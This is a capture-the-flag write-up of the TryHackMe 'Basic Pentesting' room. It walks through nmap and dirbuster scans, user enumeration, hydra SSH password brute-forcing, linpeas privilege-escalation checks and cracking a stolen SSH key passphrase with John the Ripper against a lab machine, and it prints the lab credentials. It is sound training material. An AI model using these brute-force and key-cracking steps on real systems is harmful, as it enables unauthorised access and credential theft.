# THM - Basic Pentesting

[TryHackMe | Basic Pentesting](https://tryhackme.com/room/basicpentestingjt)

[TryHackMe! Basic Penetration Testing - YouTube](https://www.youtube.com/watch?v=xl2Xx5YOKcI)

> Michael Jack | 06/2022

---

## Setup

First we have to deploy the machine for the room, and get our OpenVPN connection established so we can access it from our host.

We click "Start Machine" on tryhackme and run ```sudo openvpn our-config.ovpn```.

---

## Research, Scanning, Enumeration

> Find the services exposed by the machine.

To find the services that are exposed we can use nmap!

I ran ```nmap -sC -sV -T5 -oN ./nmap 10.10.36.240```  and heres what we got:

```shell
# Nmap 7.92 scan initiated Thu Jun  2 00:25:22 2022 as: nmap -sC -sV -T5 -oN ./nmap 10.10.36.240
Warning: 10.10.36.240 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.36.240
Host is up (0.16s latency).
Not shown: 804 closed tcp ports (conn-refused), 190 filtered tcp ports (no-response)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13?
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http-proxy?
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-06-02T04:28:26
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2022-06-02T00:28:27-04:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jun  2 00:29:48 2022 -- 1 IP address (1 host up) scanned in 266.65 seconds

```

We can see that ports 22, 80, 139, 445, 8009, and 8080 are open on the machine.

This corresponds to SSH, an HTTP web-server, some SMB, "ajp13"?, and a possible http proxy.

> What is the name of the hidden directory on the web server(enter name without /)?

If we open the IP in our web-browser and specify port 80 we can see a simple website that says "Undergoing maintenance". If we view the source we can alo see "*Check our dev note section if you need to know what to work on.*"

If we try and just add variation of "dev note" to the url we don't seem to find anything. However when we get a page not found error it does reveal that this is a ```Apache/2.4.18``` server, which could be useful information.

If we use the tool ```dirbuster``` we can do some directory brute-forcing to find some hidden stuff. Here is the report from running it on the website with the apache 2.3 medium wordlist that dirbuster provides by default:

```
DirBuster 1.0-RC1 - Report
http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
Report produced on Thu Jun 02 00:58:41 EDT 2022
--------------------------------

http://10.10.36.240:80
--------------------------------
Directories found during testing:

Dirs found with a 200 response:

/
/development/

Dirs found with a 403 response:

/icons/
/icons/small/


--------------------------------
Files found during testing:

Files found with a 200 responce:

/development/dev.txt
/development/j.txt


--------------------------------

```

We found a development directory! Another question down.

Inside we have ```dev.txt```:

```
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
```

As well as ```j.txt```:

```
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
```

Looks like this gives us some more information. Apache strura 2.5.12 is used, SMB is configured, and theres some sort of weak password in /etc/shadow on the machine? Interesting..

> Use brute-forcing to find the username & password

Here we will try and do some more enumeration using ```enum4linux``` to try and get some information about possible users on the machiner or anything else we could exploit.

We can run ```enum4linux -a 10.10.36.240 | tee enum4linux.log``` to run it and save a log. 

> What is the username?

When it's done we see:

```
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)

```

Revealing to us that there are the users "```jan```" and "```kay```" on the machine. Using this information we can run another brute-force tool for the password: ```hydra```.

> What is the password?

For this we will run ```hydra -l jan -P /path/to/rockyou.txt ssh://10.10.36.240```.

This could take some time but hopefully since we know the password is weak it won't be too difficult to get this way.

After a little while hydra returns:

```
[22][ssh] host: 10.10.36.240   login: jan   password: armando
```

So the password for jan is ```armando```!

---

## Exploitation

> What service do you use to access the server?

Now we have all the information we need to access the machine using ```SSH```!

So we can go ```ssh jan @10.10.36.240```, enter the password ```armando``` and we're in!

If we check the default directory with ```ls -la``:

```shell
jan@basic2:~$ ls -la
total 12
drwxr-xr-x 2 root root 4096 Apr 23  2018 .
drwxr-xr-x 4 root root 4096 Apr 19  2018 ..
-rw------- 1 root jan    47 Apr 23  2018 .lesshst
```

We can try checking that ```.lesshst``` file, but jan doesn't seem to have the permissions necessary. 

Also checked out /etc/passwd to see if there was anything useful:

```shell
jan@basic2:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
kay:x:1000:1000:Kay,,,:/home/kay:/bin/bash
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
tomcat9:x:999:999::/home/tomcat9:/bin/false
jan:x:1001:1001::/home/jan:/bin/bash
```

We can't access /etc/shadow due to our low privileges.

We could ```cd ..``` to the home directory, and check out the directory for the user kay:

```shell
jan@basic2:/home/kay$ ls -la
total 48
drwxr-xr-x 5 kay  kay  4096 Apr 23  2018 .
drwxr-xr-x 4 root root 4096 Apr 19  2018 ..
-rw------- 1 kay  kay   756 Apr 23  2018 .bash_history
-rw-r--r-- 1 kay  kay   220 Apr 17  2018 .bash_logout
-rw-r--r-- 1 kay  kay  3771 Apr 17  2018 .bashrc
drwx------ 2 kay  kay  4096 Apr 17  2018 .cache
-rw------- 1 root kay   119 Apr 23  2018 .lesshst
drwxrwxr-x 2 kay  kay  4096 Apr 23  2018 .nano
-rw------- 1 kay  kay    57 Apr 23  2018 pass.bak
-rw-r--r-- 1 kay  kay   655 Apr 17  2018 .profile
drwxr-xr-x 2 kay  kay  4096 Apr 23  2018 .ssh
-rw-r--r-- 1 kay  kay     0 Apr 17  2018 .sudo_as_admin_successful
-rw------- 1 root kay   538 Apr 23  2018 .viminfo
```

Some interesting stuff here, but we can't do much with it yet.

---

## Privilege Escalation

> Enumerate the machine to find any vectors for privilege escalation

Let's try to use ```linpeas``` for privilege escalation. We can get the ```linpeas.sh``` script onto the machine using scp and our credentials for jan.

```shell
scp /opt/linpeas.sh jan@10.10.36.240:/dev/shm
```

Once on the machine, we go to that directory, mark it executable (```chmod +x```) and then run it and write it to a log for our records (```./linpeas.sh | tee linlog.txt```).

Linpeas gives us a ton of information and is a very powerful tool.

One yello (max privesc potential) CVE that linpeas alerted on is **CVE-2021-4034**. Not sure if we'll be digging into that but something to research.

We also can see that linpean finds ssh files. /home/kay/.ssh/id_rsa is a private ssh key we could use to login as kay! 

Try and login with it and...

```shell
 ╭─michaelj@MJ in ~/Documents/IT and Cyber Self Study /THM/Basic-Pentesting took 2ms
 ╰─λ ssh -i kay_id_rsa kay@10.10.36.240
Enter passphrase for key 'kay_id_rsa': 
```

Okay more steps. Lets use ```JohnTheRipper```, it has tools to get a hash from a password protected ssh file, and to get the password from that hash.

The tool ```ssh2john``` had an error with python3 when I tried it, but there are web tools that use it such as [Private Key SSH RSA DSA OpenSSH Hash Extractor | Online Hash Crack](https://www.onlinehashcrack.com/tools-private-key-ssh-rsa-dsa-openssh-hash-extractor.php). 

Regardless, once we get the hash we can run:

```shell
john key_hash.txt --wordlist=/path/to/rockyou.txt
Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
Use the "--format=ssh-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 16 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
beeswax          (?)
1g 0:00:00:01 DONE (2022-06-02 02:46) 0.6060g/s 8691Kp/s 8691Kc/s 8691KC/s  0 0 0..*7¡Vamos!
Session completed
```

Which revelas the password for kay is ```beeswax```!

> What is the final password you obtain?

We might recall we saw a ```pass.bak``` file in kay's home directory before but we couldn't read it.

```shell
cat pass.bak
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```

---














